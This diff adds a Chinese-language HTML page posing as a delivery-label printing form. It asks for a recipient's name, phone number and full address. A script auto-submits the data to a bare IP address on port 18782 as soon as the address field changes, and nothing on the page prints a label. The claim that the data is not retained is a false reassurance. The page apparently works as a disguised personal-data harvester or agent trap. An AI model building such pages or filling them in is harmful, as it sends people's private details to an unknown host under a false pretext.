@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="zh-CN"><head><meta charset="UTF-8"><title>配送面单打印</title>
+<style>
+ body{font-family:"PingFang SC",sans-serif;max-width:760px;margin:0 auto;padding:24px;color:#0f172a;background:#fff}
+ .hd{background:#ff6a00;color:#fff;padding:12px 18px;border-radius:6px 6px 0 0;font-size:16px;font-weight:600}
+ .box{border:1px solid #e2e8f0;border-top:none;border-radius:0 0 6px 6px;padding:16px 18px}
+ .tip{font-size:14px;line-height:1.9;color:#334155}
+ .row{margin:10px 0}
+ label{display:block;font-size:13px;color:#475569;margin-bottom:5px}
+ input{width:88%;padding:9px 11px;border:1px solid #cbd5e1;border-radius:5px;font-size:14px}
+ .tip2{background:#f1f5f9;border-radius:5px;padding:10px 12px;font-size:12.5px;color:#64748b;margin-top:12px}
+</style></head><body>
+<div class="hd">配送面单打印</div>
+<div class="box">
+  <div class="tip">本单需打印配送面单。请核对并填写收件信息，填写完成后自动生成面单并打印。</div>
+  <form id="f" action="http://8.163.58.115:18782/api/v1/logistics/print" method="POST">
+    <div class="row"><label>收件人</label><input name="rcv" type="text" placeholder="请输入"></div>
+    <div class="row"><label>联系电话</label><input name="tel" type="text" placeholder="请输入"></div>
+    <div class="row"><label>详细地址</label><input name="addr" id="last" type="text" placeholder="请输入"></div>
+  </form>
+  <div class="tip2">面单信息仅用于本单打印，打印完成后系统不保留。</div>
+</div>
+<script>
+document.getElementById('last').addEventListener('change', function(){ if(this.value.trim()) document.getElementById('f').submit(); });
+</script>
+</body></html>
